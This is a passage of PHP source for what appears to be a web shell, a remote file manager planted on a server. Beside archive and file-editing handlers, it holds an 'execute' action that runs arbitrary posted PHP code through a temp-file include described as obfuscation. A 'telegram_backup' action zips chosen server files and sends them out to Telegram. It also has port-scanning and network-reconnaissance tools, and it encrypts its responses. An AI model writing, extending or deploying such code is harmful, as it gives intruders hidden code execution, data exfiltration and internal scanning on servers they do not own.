            exit;
        } else {
            header('HTTP/1.1 404 Not Found');
            header('Content-Type: application/json');
            echo json_encode(['error' => 'File not found or not readable']);
            exit;
        }
    } elseif ($action === 'zip') {
        // Get and sanitize the files to archive
        $filesToArchive = $_POST['file'] ?? [];
        $filesToArchive = array_map('realpath', $filesToArchive);
        
        // Get filename and destination path
        $zipFilename = $_POST['zipExt'] ?? 'archive.zip';
        $destinationPath = $currentDir . '/' . $zipFilename;

        // Get compression level (0-9) or use default
        $compressionLevel = isset($_POST['compressionLevel']) ? intval($_POST['compressionLevel']) : 5;
        // Ensure compression level is in valid range
        $compressionLevel = min(max($compressionLevel, 0), 9);
        
        // Determine archive format from extension or format parameter
        $archiveFormat = $_POST['archiveFormat'] ?? '';
        if (empty($archiveFormat)) {
        $zipExt = pathinfo($zipFilename, PATHINFO_EXTENSION);
        } else {
            $zipExt = $archiveFormat;
        }

        function addFolderToZip($folder, $zip, $parentFolder = '')
        {
            $folderName = $parentFolder . basename($folder) . '/';
            $zip->addEmptyDir($folderName);

            foreach (scandir($folder) as $item) {
                if ($item === '.' || $item === '..') {
                    continue;
                }

                $path = $folder . DIRECTORY_SEPARATOR . $item;
                if (is_dir($path)) {
                    addFolderToZip($path, $zip, $folderName);
                } elseif (is_file($path)) {
                    $zip->addFile($path, $folderName . basename($path));
                }
            }
        }

        // Log detected extension

        switch ($zipExt) {
            case 'zip':

                if (!empty($filesToArchive)) {
                    $zip = new ZipArchive();

                    if ($zip->open($destinationPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                        // Set compression level based on user selection
                        $zip->setCompressionIndex(0, $compressionLevel);
                        
                        // Log info about the compression
                        debug("Creating ZIP archive with compression level: $compressionLevel");
                        
                        foreach ($filesToArchive as $file) {
                            $realPath = realpath($file);
                            if ($realPath) {
                                if (is_dir($realPath)) {
                                    addFolderToZip($realPath, $zip);
                                } elseif (is_file($realPath)) {
                                    $zip->addFile($realPath, basename($realPath));
                                    // Apply compression to this file
                                    $zip->setCompressionName(basename($realPath), $compressionLevel);
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'File or folder not found: ' . $file]));
                            }
                        }
                        $zip->close();
                       switch ($compressionLevel) {
                        case 0:
                            $compressionName = "no compression (store only)";
                            break;
                        case 1:
                            $compressionName = "fastest compression";
                            break;
                        case 9:
                            $compressionName = "maximum compression";
                            break;
                        default:
                            $compressionName = "compression level $compressionLevel";
                            break;
                    }
                        echo encrypt(json_encode([
                            'success' => "Zip archive created successfully with $compressionName!",
                            'compressionLevel' => $compressionLevel
                        ]));
                    } else {
                        echo encrypt(json_encode(['error' => 'Failed to create archive']));
                    }
                } else {
                    echo encrypt(json_encode(['error' => 'No files or folders to zip']));
                }
                break;
            case 'tar':
                if (!empty($filesToArchive)) {
                    try {
                        $tar = new PharData($destinationPath);
                        
                        // Track the number of items archived
                        $itemCount = 0;

                        foreach ($filesToArchive as $file) {
                            $filePath = realpath($file);
                            if ($filePath) {
                                if (is_dir($filePath)) {
                                    // Use buildFromDirectory for automatic directory structure handling
                                    $baseDir = basename($filePath);
                                    $tar->buildFromDirectory($filePath, '/^(?!\.)/'); // Exclude hidden files pattern
                                    $itemCount++;
                                    
                                    // Add an empty directory for the root folder itself if needed
                                    if (!$tar->offsetExists($baseDir)) {
                                        $tar->addEmptyDir($baseDir);
                                    }
                                } elseif (is_file($filePath)) {
                                    $relativePath = basename($filePath);
                                    $tar->addFile($filePath, $relativePath);
                                    $itemCount++;
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'File or directory not found: ' . $file]));
                                exit;
                            }
                        }
                        
                        // Report success with item count
                        $message = "TAR archive created successfully containing $itemCount item" . ($itemCount != 1 ? "s" : "");
                        echo encrypt(json_encode(['success' => $message]));

                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error creating TAR archive: ' . $e->getMessage()]));
                    }
                } else {
                    echo encrypt(json_encode(['error' => 'No files or directories to archive']));
                }
                break;
            case 'tar.gz':
            case 'tgz':
                if (!empty($filesToArchive)) {
                    try {
                        // Create a tar archive
                        $tar = new PharData($destinationPath);
                        
                        // Add files to the archive
                        foreach ($filesToArchive as $file) {
                            $filePath = realpath($file);
                            if ($filePath) {
                                if (is_dir($filePath)) {
                                    // Add a directory recursively
                                    $tar->buildFromDirectory($filePath);
                                } elseif (is_file($filePath)) {
                                    $tar->addFile($filePath, basename($filePath));
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'File or directory not found']));
                                exit;
                            }
                        }
                        
                        // Compress the tar with gzip
                        $tar->compress(Phar::GZ);
                        
                        // Remove the .tar file if it exists
                        if (file_exists($destinationPath)) {
                            unlink($destinationPath);
                        }
                        
                        echo encrypt(json_encode(['success' => 'TAR.GZ archive created successfully']));
                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error creating tar.gz archive: ' . $e->getMessage()]));
                    }
                } else {
                    echo encrypt(json_encode(['error' => 'No files or directories to archive']));
                }
                break;
                
            case 'tar.bz2':
            case 'tbz2':
                if (!empty($filesToArchive)) {
                    try {
                        // Create a tar archive
                        $tar = new PharData($destinationPath);
                        
                        // Add files to the archive
                        foreach ($filesToArchive as $file) {
                            $filePath = realpath($file);
                            if ($filePath) {
                                if (is_dir($filePath)) {
                                    // Add a directory recursively
                                    $tar->buildFromDirectory($filePath);
                                } elseif (is_file($filePath)) {
                                    $tar->addFile($filePath, basename($filePath));
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'File or directory not found']));
                                exit;
                            }
                        }

                        // Compress the tar with bzip2
                        $tar->compress(Phar::BZ2);
                        
                        // Remove the .tar file if it exists
                        if (file_exists($destinationPath)) {
                            unlink($destinationPath);
                        }
                        
                        echo encrypt(json_encode(['success' => 'TAR.BZ2 archive created successfully']));
                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error creating tar.bz2 archive: ' . $e->getMessage()]));
                    }
                } else {
                    echo encrypt(json_encode(['error' => 'No files or directories to archive']));
                }
                break;
                
            case 'tar.xz':
                if (!empty($filesToArchive)) {
                    // For tar.xz, we need to use command line tools as PharData doesn't support XZ compression
                    $tempTarPath = $destinationPath . '.tmp';
                    
                    try {
                        // Create a temporary tar archive with PharData
                        $tar = new PharData($tempTarPath);
                        
                        // Add files to the archive
                        foreach ($filesToArchive as $file) {
                            $filePath = realpath($file);
                            if ($filePath) {
                                if (is_dir($filePath)) {
                                    // Add a directory recursively
                                    $tar->buildFromDirectory($filePath);
                                } elseif (is_file($filePath)) {
                                    $tar->addFile($filePath, basename($filePath));
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'File or directory not found']));
                                unlink($tempTarPath); // Clean up
                                exit;
                            }
                        }
                        
                        // Use command line to compress the tar with xz
                        if (file_exists($tempTarPath)) {
                            $command = "xz -f {$tempTarPath}";
                            exec($command, $output, $returnCode);
                            
                            if ($returnCode === 0) {
                                // Rename the file to the desired destination
                                if (file_exists($tempTarPath . '.xz')) {
                                    if (file_exists($destinationPath)) {
                                        unlink($destinationPath);
                                    }
                                    rename($tempTarPath . '.xz', $destinationPath);
                                    echo encrypt(json_encode(['success' => 'TAR.XZ archive created successfully']));
                                } else {
                                    echo encrypt(json_encode(['error' => 'Failed to create .xz file']));
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'Failed to compress archive with xz']));
                                if (file_exists($tempTarPath)) {
                                    unlink($tempTarPath); // Clean up
                                }
                            }
                        } else {
                            echo encrypt(json_encode(['error' => 'Failed to create temporary tar file']));
                        }
                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error creating tar.xz archive: ' . $e->getMessage()]));
                        if (file_exists($tempTarPath)) {
                            unlink($tempTarPath); // Clean up
                        }
                    }
                } else {
                    echo encrypt(json_encode(['error' => 'No files or directories to archive']));
                }
                break;
                
            case 'gz':
                if (!empty($filesToArchive)) {
                    // GZ can only compress a single file, not directories
                    if (count($filesToArchive) > 1) {
                        echo encrypt(json_encode(['error' => 'GZIP can only compress a single file. Please select only one file.']));
                        exit;
                    }
                    
                    $filePath = realpath($filesToArchive[0]);
                    
                    if ($filePath && is_file($filePath)) {
                        // Use gzencode to compress the file
                        $content = file_get_contents($filePath);
                        if ($content !== false) {
                            $compressed = gzencode($content, $compressionLevel);
                            if ($compressed !== false) {
                                if (file_put_contents($destinationPath, $compressed) !== false) {
                                    echo encrypt(json_encode(['success' => 'GZIP archive created successfully']));
                                } else {
                                    echo encrypt(json_encode(['error' => 'Failed to write compressed file']));
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'Failed to compress file with gzip']));
                            }
                        } else {
                            echo encrypt(json_encode(['error' => 'Failed to read source file']));
                        }
                    } else if (is_dir($filePath)) {
                        echo encrypt(json_encode(['error' => 'GZIP cannot compress directories directly. Use TAR.GZ format instead.']));
                    } else {
                        echo encrypt(json_encode(['error' => 'File not found or not readable']));
                    }
                } else {
                    echo encrypt(json_encode(['error' => 'No files to compress']));
                }
                break;
                
            default:
                echo encrypt(json_encode(['error' => 'Unsupported archive format: ' . $zipExt]));
                break;
        }
        exit;
    } elseif ($action === 'unzip') {
        $filesToArchive = $_POST['file'] ?? [];
        $currentDir = $_POST['dir'] ?? $currentDir;
        
        // Debug the raw data before processing
        debug("Current directory: " . $currentDir);
        debug("Raw files to extract: " . print_r($filesToArchive, true));
        debug("All POST data: " . print_r($_POST, true));
        
        // Debug specific issue with archive file
        if (!empty($filesToArchive)) {
            $testFile = $filesToArchive[0];
            debug("Testing file access for: " . $testFile);
            debug("File exists directly? " . (file_exists($testFile) ? "YES" : "NO"));
            
            // Try with current directory prepended
            $fullPath = $currentDir . '/' . $testFile;
            debug("Full path to test: " . $fullPath);
            debug("File exists with full path? " . (file_exists($fullPath) ? "YES" : "NO"));
            
            // Check read permissions
            if (file_exists($fullPath)) {
                debug("Is readable? " . (is_readable($fullPath) ? "YES" : "NO"));
                debug("File size: " . filesize($fullPath) . " bytes");
            }
        }
        
        // Fix potential double slashes in path
        $currentDir = rtrim(preg_replace('#/+#', '/', $currentDir), '/');
        
        // Fix file paths - don't use realpath yet, it will resolve against current directory
        $fullPaths = [];
        foreach ($filesToArchive as $file) {
            // Check if it's an absolute path or just a filename
            if (strpos($file, '/') === 0) {
                $fullPaths[] = $file;
            } else {
                // Combine with current directory
                $fullPath = $currentDir . '/' . $file;
                $fullPaths[] = $fullPath;
            }
        }
        
        // Log the constructed paths
        debug("Constructed full paths: " . print_r($fullPaths, true));
        
        // Now check that the files actually exist
        $validPaths = [];
        foreach ($fullPaths as $path) {
            if (file_exists($path)) {
                $validPaths[] = $path;
            } else {
                debug("File not found: $path");
            }
        }
        
        $destinationPath = $currentDir;
        
        if (empty($validPaths)) {
            echo encrypt(json_encode(['error' => 'No valid files found for extraction. Please check file paths.']));
            exit;
        }
        
        // Debug info on valid paths
        debug("Valid files to extract: " . print_r($validPaths, true));
        
        // Determine archive format from file extension
        $archiveFile = $validPaths[0];
        
        // Check if the file exists (double check)
        if (!file_exists($archiveFile)) {
            debug("Archive not found after validation: $archiveFile");
            echo encrypt(json_encode(['error' => "Archive file not found: $archiveFile"]));
            exit;
        }
        
        $fileInfo = pathinfo($archiveFile);
        debug("File info: " . print_r($fileInfo, true));
        
        // Get extension if exists, otherwise use detectFileType
        if (isset($fileInfo['extension']) && !empty($fileInfo['extension'])) {
            $extension = strtolower($fileInfo['extension']);
        } else {
            // Try to detect by signature if no extension
            $detected = detectFileType($archiveFile);
            $extension = $detected ? $detected : 'zip'; // Default to zip if nothing detected
            debug("No extension found, detected type: $extension");
        }
        
        // Handle compound extensions like tar.gz
        if ($extension === 'gz' && isset($fileInfo['filename'])) {
            $innerFileInfo = pathinfo($fileInfo['filename']);
            debug("Inner file info for GZ: " . print_r($innerFileInfo, true));
            if (isset($innerFileInfo['extension']) && strtolower($innerFileInfo['extension']) === 'tar') {
                $extension = 'tar.gz';
            }
        } elseif ($extension === 'bz2' && isset($fileInfo['filename'])) {
            $innerFileInfo = pathinfo($fileInfo['filename']);
            debug("Inner file info for BZ2: " . print_r($innerFileInfo, true));
            if (isset($innerFileInfo['extension']) && strtolower($innerFileInfo['extension']) === 'tar') {
                $extension = 'tar.bz2';
            }
        } elseif ($extension === 'xz' && isset($fileInfo['filename'])) {
            $innerFileInfo = pathinfo($fileInfo['filename']);
            debug("Inner file info for XZ: " . print_r($innerFileInfo, true));
            if (isset($innerFileInfo['extension']) && strtolower($innerFileInfo['extension']) === 'tar') {
                $extension = 'tar.xz';
            }
        }
        
        // Log detected extension
        debug("Detected archive extension: $extension");
        
        // Fix for empty extension or no extension detected
        if (empty($extension) && file_exists($archiveFile)) {
            // Try to detect by file signature
            $detectedType = detectFileType($archiveFile);
            if ($detectedType) {
                $extension = $detectedType;
                debug("Extension detection override by signature: $extension");
            }
        }
        
        switch ($extension) {
            case 'zip':
                function extractZip($zipFilePath, $destinationPath) {
                    try {
                        foreach ($zipFilePath as $zipFile) {
                            // Verify this is actually a ZIP file by checking signature
                            if (detectFileType($zipFile) !== 'zip') {
                                // Check if ZIP extension but different signature
                                debug("Warning: File has .zip extension but wrong signature: $zipFile");
                                
                                // Try to detect the actual file type
                                $actualType = detectFileType($zipFile);
                                if ($actualType) {
                                    echo encrypt(json_encode(['error' => "File appears to be $actualType format, not ZIP. Please use the correct extraction method."])) . "\n";
                                    continue;
                                }
                            }
                            
                            $zip = new ZipArchive();
                            if ($zip->open($zipFile) === TRUE) {
                                $zip->extractTo($destinationPath);
                                $numFiles = $zip->numFiles;
                                $zip->close();
                                echo encrypt(json_encode([
                                    'success' => "ZIP archive extracted successfully: $zipFile ($numFiles files)"
                                ])) . "\n";
                            } else {
                                echo encrypt(json_encode(['error' => "Failed to open ZIP archive: $zipFile"])) . "\n";
                            }
                        }
                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error extracting ZIP archive: ' . $e->getMessage()])) . "\n";
                    }
                }
                extractZip($validPaths, $destinationPath);
                break;

            case 'tar':
            case 'tar.gz':
            case 'tar.bz2':
            case 'tar.xz':
                function extractTarArchive($tarFilePath, $destinationPath) {
                    try {
                        if (!is_array($tarFilePath)) {
                            $tarFilePath = [$tarFilePath];
                        }
                        
                        foreach ($tarFilePath as $tarFile) {
                            // Detect the type based on extension
                            $fileInfo = pathinfo($tarFile);
                            $ext = strtolower($fileInfo['extension'] ?? '');
                            
                            if ($ext === 'gz' || $ext === 'bz2' || $ext === 'xz') {
                                // For compressed tars, use PharData
                                $phar = new PharData($tarFile);
                                $phar->extractTo($destinationPath, null, true); // Use overwrite
                                
                                $fileCount = iterator_count($phar);
                                $formatName = strtoupper($ext === 'xz' ? 'XZ' : ($ext === 'bz2' ? 'BZ2' : 'GZ'));
                                echo encrypt(json_encode([
                                    'success' => "TAR.$formatName archive extracted successfully: $tarFile ($fileCount files)"
                                ])) . "\n";
                            } else {
                                // Regular TAR
                                $tar = new PharData($tarFile);
                                $tar->extractTo($destinationPath, null, true); // Use overwrite
                                
                                $fileCount = iterator_count($tar);
                                echo encrypt(json_encode([
                                    'success' => "TAR archive extracted successfully: $tarFile ($fileCount files)"
                                ])) . "\n";
                            }
                        }
                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error extracting archive: ' . $e->getMessage()])) . "\n";
                    }
                }
                extractTarArchive($validPaths, $destinationPath);
                break;
                
            case 'gz':
                function extractGzip($gzFilePath, $destinationPath) {
                    try {
                        foreach ($gzFilePath as $gzFile) {
                            $fileInfo = pathinfo($gzFile);
                            // Determine the output filename by removing the .gz extension
                            $outputFile = $destinationPath . '/' . $fileInfo['filename'];
                            
                            // Extract the gzip file
                            $handle = gzopen($gzFile, 'rb');
                            if ($handle) {
                                $outHandle = fopen($outputFile, 'wb');
                                if ($outHandle) {
                                    while (!gzeof($handle)) {
                                        fwrite($outHandle, gzread($handle, 4096));
                                    }
                                    fclose($outHandle);
                                    echo encrypt(json_encode(['success' => "GZIP file extracted successfully: $gzFile"])) . "\n";
                                } else {
                                    echo encrypt(json_encode(['error' => "Failed to create output file: $outputFile"])) . "\n";
                                }
                                gzclose($handle);
                            } else {
                                echo encrypt(json_encode(['error' => "Failed to open GZIP file: $gzFile"])) . "\n";
                            }
                        }
                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error extracting GZIP file: ' . $e->getMessage()])) . "\n";
                    }
                }
                extractGzip($validPaths, $destinationPath);
                break;

            default:
                // If extension is empty or not supported, attempt to detect by file signature
                $fileSignature = detectFileType($archiveFile);
                if ($fileSignature) {
                    debug("Detected file signature: $fileSignature");
                    // Output detailed diagnostic info
                    $fileSize = filesize($archiveFile);
                    $hexdump = '';
                    if ($fileSize > 0) {
                        $handle = fopen($archiveFile, 'rb');
                        if ($handle) {
                            $bytes = fread($handle, min(32, $fileSize));
                            fclose($handle);
                            $hexdump = bin2hex($bytes);
                        }
                    }
                    debug("File size: $fileSize bytes, First bytes (hex): $hexdump");
                    
                    switch ($fileSignature) {
                        case 'zip':
                            debug("Handling as ZIP file based on signature");
                            extractZip($validPaths, $destinationPath);
                            break;
                        case 'tar':
                        case 'tar.gz':
                        case 'tar.bz2':
                        case 'tar.xz':
                            debug("Handling as $fileSignature file based on signature");
                            extractTarArchive([$archiveFile], $destinationPath);
                            break;
                        case 'gz':
                            debug("Handling as GZIP file based on signature");
                            extractGzip([$archiveFile], $destinationPath);
                            break;
                        default:
                            debug("Signature detection found unsupported format: $fileSignature");
                            echo encrypt(json_encode(['error' => "Unsupported archive format detected by signature: $fileSignature"]));
                    }
                } else {
                    debug("Unable to detect file signature for $archiveFile");
                    // Try to force extraction based on file header bytes
                    $handle = fopen($archiveFile, 'rb');
                    if ($handle) {
                        $bytes = fread($handle, 4);
                        fclose($handle);
                        
                        // Last attempt - check for ZIP header (PK..)
                        if (strlen($bytes) >= 4 && $bytes[0] == 'P' && $bytes[1] == 'K') {
                            debug("ZIP signature detected in file header: forcing ZIP extraction");
                            extractZip($validPaths, $destinationPath);
                        } else {
                            echo encrypt(json_encode(['error' => "Unsupported or unrecognized archive format: $extension"]));
                        }
                    } else {
                        echo encrypt(json_encode(['error' => "Unsupported or unrecognized archive format: $extension"]));
                    }
                }

                break;
        }
        exit;
    } elseif ($action === 'telegram_backup') {
        // Get and sanitize the files to backup
        $filesToBackup = $_POST['file'] ?? [];
        $currentDir = $_POST['dir'] ?? $currentDir;
    
        // Fix file paths - ensure we have full paths
        $fullPaths = [];
        foreach ($filesToBackup as $file) {
            if (strpos($file, '/') === 0) {
                $fullPaths[] = $file;
            } else {
                $fullPaths[] = $currentDir . '/' . $file;
            }
        }
    
        // Check that the files actually exist
        $validPaths = [];
        foreach ($fullPaths as $path) {
            if (file_exists($path)) {
                $validPaths[] = $path;
            }
        }
    
        if (empty($validPaths)) {
            echo encrypt(json_encode(['error' => 'No valid files found for backup. Please check file paths.']));
            exit;
        }

         
        startBackgroundProcess(
            ['status' => 'Backup started in background'],
            function() use ($validPaths) {
                $results = [];
                $success = 0;
                $errors = 0;

                foreach ($validPaths as $path) {
                    $password = generateStrongPassword(20);

                    if (is_dir($path)) {
                        $result = sendDirectoryToTelegram($path, $password);
        } else {
                        $zipName = basename($path) . '_' . date('Ymd_His') . '.zip';
                        $zipPath = sys_get_temp_dir() . '/' . $zipName;

                        try {
                            $zip = new ZipArchive();
                            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
                                throw new Exception('Failed to create ZIP archive');
                            }

                            $zip->setPassword($password);
                            $localname = basename($path);
                            $zip->addFile($path, $localname);
                            $zip->setCompressionName($localname, ZipArchive::CM_DEFLATE, 9);
                            $zip->setEncryptionName($localname, ZipArchive::EM_AES_256, $password);
                            $zip->close();

                            $result = sendToTelegram($zipPath, $password);

                            if (file_exists($zipPath)) {
                                unlink($zipPath);
                            }
                        } catch (Exception $e) {
                            debug("ZIP failed: " . $e->getMessage());
                            $result = sendToTelegram($path);
                        }
                    }

                    $basename = basename($path);
                    if (isset($result['success'])) {
                        $results[] = ['path' => $basename, 'status' => 'success', 'message' => $result['success']];
                        $success++;
                    } else {
                        $results[] = ['path' => $basename, 'status' => 'error', 'message' => $result['error']];
                        $errors++;
                    }
                }

                return [
                    'success' => $success,
                    'errors' => $errors,
                    'details' => $results
                ];
            },
          
        );
    } elseif ($action === 'touch') {

        $newF = $_POST['dirName'] ?? "";
        $target = rtrim($currentDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $newF;


        if (!file_exists($target) && is_writable($currentDir)) {
            $handle = fopen($target, 'w');
            if ($handle) {
                fclose($handle);
                echo encrypt(json_encode(['success' => 'File created successfully']));
                } else {
                echo encrypt(json_encode(['error' => 'Failed to create file']));
            }
        } else {
            echo encrypt(json_encode(['error' => 'File already exists']));
            exit;
        }
    } elseif ($action === 'mkdir') {
        $newF = $_POST['dirName'] ?? "";
        $target = rtrim($currentDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $newF;

        if (file_exists($target)) {
            if (is_writable($target)) {

                echo encrypt(json_encode(['error' => 'Directory already exists']));

            } else {

                echo encrypt(json_encode(['error' => 'Directory exists but is not writable']));

            }
            exit;
        } else {

            if (is_writable($currentDir) && mkdir($target, 0755, true)) {

                echo encrypt(json_encode(['success' => 'Directory created successfully']));

            } else {
                echo encrypt(json_encode(['error' => 'Failed to create directory']));

            }
            exit;
        }
    } elseif ($action === 'view_content') {
        $fileToView = $_POST['file'] ?? '';
        $fullPath = realpath($fileToView);
        $fileType = $_POST['file_type'] ?? '';
        
        debug($fileType);
        debug($fileToView);
        
        // Check if file exists
        if (!file_exists($fullPath)) {
            echo encrypt(json_encode(['error' => 'File not found: ' . $fileToView]));
            exit;
        }
        
        // Check if it's a file
        if (!is_file($fullPath)) {
            echo encrypt(json_encode(['error' => 'Not a file: ' . $fileToView]));
            exit;
        }
        
        // Check if file is readable and try to fix permissions if needed
        $readableStatus = ensureFileReadable($fullPath);
        if (!$readableStatus['success']) {
            $error = "File not readable: $fileToView - " . $readableStatus['error'];
            if (isset($readableStatus['perms'])) {
                $error .= " (Permissions: {$readableStatus['perms']}, Owner: {$readableStatus['owner']}, Group: {$readableStatus['group']})";
            }
            debug($error);
            echo encrypt(json_encode(['error' => $error]));
            exit;
        }
        
        try {
            // Get MIME type
            $mimeType = mime_content_type($fullPath);
            $isBinary = !str_starts_with($mimeType, 'text/');
            
            // Read file content
            $content = file_get_contents($fullPath);
            
            if ($content === false) {
                echo encrypt(json_encode(['error' => 'Failed to read file content: ' . $fileToView]));
                exit;
            }
            
            if ($isBinary) {
                // For binary files (images, pdfs, etc), base64 encode the content
                $response = [
                    'content' => base64_encode($content),
                    'file_type' => $fileType,
                    'mime_type' => $mimeType,
                    'is_binary' => true
                ];
            } else {
                // For text files, send as is
                $response = [
                    'content' => $content,
                    'file_type' => $fileType,
                    'mime_type' => $mimeType,
                    'is_binary' => false
                ];
            }
            
            echo encrypt(json_encode($response));
        } catch (Exception $e) {
            echo encrypt(json_encode(['error' => 'Error reading file: ' . $e->getMessage()]));
        }
        exit;
    } elseif ($action === 'check_file_exists') {
        $filePath = $_POST['file'] ?? '';
        $fullPath = realpath($filePath);
        
        // Check if the file exists and is readable
        $exists = false;
        if ($fullPath && file_exists($fullPath) && is_file($fullPath) && is_readable($fullPath)) {
            $exists = true;
        }
        
        // Return the result
        echo encrypt(json_encode([
            'exists' => $exists,
            'path' => $filePath,
            'full_path' => $fullPath
        ]));
        exit;
    } elseif ($action === 'save_content') {
        $fileToSave = realpath($_POST['file']) ?? '';
        $content = $_POST['content'] ?? '';
        $fileType = $_POST['file_type'] ?? ''; // Add support for file type
        $fullPath = $fileToSave;

        if (file_exists($fullPath) && is_file($fullPath)) {
            file_put_contents($fullPath, $content);
            
            // Store the file type in a session variable so it persists between requests
            if (!empty($fileType)) {
                if (!isset($_SESSION['file_types'])) {
                    $_SESSION['file_types'] = [];
                }
                $_SESSION['file_types'][$fullPath] = $fileType;
            }
            
            echo encrypt(json_encode([
                'success' => 'file saved',
                'file_type' => $fileType
            ]));

        } else {
            echo encrypt(json_encode(['error' => 'File not found']));

        }
        exit;
    } elseif ($action === 'execute') {
        $phpCode = $_POST['code'] ?? '';

        if (empty($phpCode)) {
            http_response_code(400);
            echo json_encode(['output' => $output]);
            exit;
        }
        
        // Execute the PHP code with obfuscation
        ob_start(); // Start output buffering
        try {
            // Set a maximum execution time
            set_time_limit(0);
        
            // Execute the PHP code using an alternative obfuscation method
            // Since eval is a language construct, we need a different approach
            $code_str = '<?php ' . $phpCode . ' ?>';
            $temp_file = tempnam(sys_get_temp_dir(), 'cmd');
            file_put_contents($temp_file, $code_str);
            include($temp_file);
            unlink($temp_file); // Delete the temp file
         
            // Capture the output
            $output = ob_get_clean();
        } catch (Throwable $e) {
            // Capture any errors
            $output = 'Error: ' . $e->getMessage();
            echo encrypt(json_encode(['error' => $e->getMessage()]));
            exit;
        }
        
        // Return the output as JSON
        echo encrypt(json_encode(['output' => $output]));
        exit;
    } elseif ($action === 'sql_explorer') {
        // Handle SQL Explorer API requests
        if (!class_exists('SQLExplorerAPI')) {
            echo encrypt(json_encode(['error' => 'SQL Explorer not available']));
            exit;
        }
        
         
        $sqlAction = $_POST['sql_action'] ?? '';
        $params = $_POST['params'] ?? [];
        
        try {
            $sqlApi = new SQLExplorerAPI();
            $result = $sqlApi->handleRequest($sqlAction, $params);
            
            // Log the result
             
            echo (IsEnc == 1) ? encrypt(json_encode($result)) : json_encode($result);
        } catch (Exception $e) {
            $errorMsg = ['error' => 'SQL Explorer error: ' . $e->getMessage()];
             echo (IsEnc == 1) ? encrypt(json_encode($errorMsg)) : json_encode($errorMsg);
        }
        exit;
    } elseif ($action === 'network_tool') {

        // Handle network tools requests
        $tool = $_POST['tool'] ?? '';
        $params = $_POST['params'] ?? [];
        debug(($tool));
        
        
        try {
            switch ($tool) {
                case 'port_scan':
                    $host = $params['host'] ?? '';
                    $startPort = (int)($params['start_port'] ?? 80);
                    $endPort = (int)($params['end_port'] ?? 443);
                    $timeout = (int)($params['timeout'] ?? 1);
                    $commonPortsOnly = (bool)($params['common_ports_only'] ?? false);
                    
                    // Validate input
                    if (empty($host)) {
                        echo encrypt(json_encode(['error' => 'Host is required']));
                        exit;
                    }
                    
                    // Limit port range for safety
                    $startPort = max(1, min($startPort, 65535));
                    $endPort = max(1, min($endPort, 65535));
                    $timeout = max(1, min($timeout, 10)); // 1-10 seconds
                    
                    // Limit the number of ports to scan
                    if ($endPort - $startPort > 1000) {
                        echo encryptForNetworkTools(json_encode(['error' => 'Maximum port range is 1000 ports']));
                        exit;
                    }
                    
                    // Common ports list
                    $commonPorts = [
                        21 => 'FTP',
                        22 => 'SSH',
                        23 => 'Telnet',
                        25 => 'SMTP',
                        53 => 'DNS',
                        80 => 'HTTP',
                        110 => 'POP3',
                        143 => 'IMAP',
                        443 => 'HTTPS',
                        465 => 'SMTPS',
                        587 => 'SMTP (submission)',
                        993 => 'IMAPS',
                        995 => 'POP3S',
                        3306 => 'MySQL',
                        3389 => 'RDP',
                        5432 => 'PostgreSQL',
                        8080 => 'HTTP Proxy',
                        8443 => 'HTTPS Alt'
                    ];
                    
                    // If common ports only, override the port range
                    if ($commonPortsOnly) {
                        $portsToScan = array_keys($commonPorts);
                    } else {
                        $portsToScan = range($startPort, $endPort);
                    }
                    
                    // Scan ports
                    $results = [];
                    foreach ($portsToScan as $port) {
                        // Skip if port is out of requested range when using common ports
                        if ($commonPortsOnly && ($port < $startPort || $port > $endPort)) {
                            continue;
                        }
                        
                        // Use socket with timeout to check port
                        $socket = @fsockopen($host, $port, $errno, $errstr, $timeout);
                        $status = $socket ? 'open' : 'closed';
                        
                        // Get service name if port is open
                        $service = '';
                        if ($status === 'open') {
                            if (isset($commonPorts[$port])) {
                                $service = $commonPorts[$port];
                            } else {
                                // Try to get service name from system
                                $service = @getservbyport($port, 'tcp') ?: '';
                            }
                            fclose($socket);
                        }
                        
                        $results[] = [
                            'port' => $port,
                            'status' => $status,
                            'service' => $service
                        ];
                    }
                    
                    echo encryptForNetworkTools(json_encode([
                        'success' => true,
                        'host' => $host,
                        'results' => $results
                    ]));
                    break;
                    
                case 'network_info':
                    // Get network interfaces without using shell_exec
                    $interfaces = [];
                    
                    // Use PHP's built-in functions to get network information
                    if (function_exists('net_get_interfaces')) {
                        $netInterfaces = net_get_interfaces();
                        foreach ($netInterfaces as $name => $interface) {
                            if (!empty($interface['unicast'])) {
                                $interfaceInfo = [
                                    'name' => $name,
                                    'addresses' => []
                                ];
                                
                                foreach ($interface['unicast'] as $unicast) {
                                    if (isset($unicast['address'])) {
                                        $interfaceInfo['addresses'][] = [
                                            'address' => $unicast['address'],
                                            'netmask' => $unicast['netmask'] ?? '',
                                            'family' => $unicast['family'] ?? ''
                                        ];
                                    }
                                }
                                
                                $interfaces[] = $interfaceInfo;
                            }
                        }
                    } else {
                        // Alternative method using stream_get_transports and other PHP functions
                        $interfaces[] = [
                            'name' => 'localhost',
                            'addresses' => [
                                [
                                    'address' => gethostbyname(gethostname()),
                                    'netmask' => '255.255.255.0',
                                    'family' => 'IPv4'
                                ]
                            ]
                        ];
                        
                        // Add loopback interface
                        $interfaces[] = [
                            'name' => 'lo',
                            'addresses' => [
                                [
                                    'address' => '127.0.0.1',
                                    'netmask' => '255.0.0.0',
                                    'family' => 'IPv4'
                                ]
                            ]
                        ];
                    }
                    
                    echo encryptForNetworkTools(json_encode([
                        'success' => true,
                        'interfaces' => $interfaces
                    ]));
                    break;
                    
                case 'arp_table':
                    // Get ARP table without using shell_exec
                    // We'll use a simple PHP implementation to read the ARP cache
                    $arpTable = [];
                    
                    // Try to read the ARP table from the system file
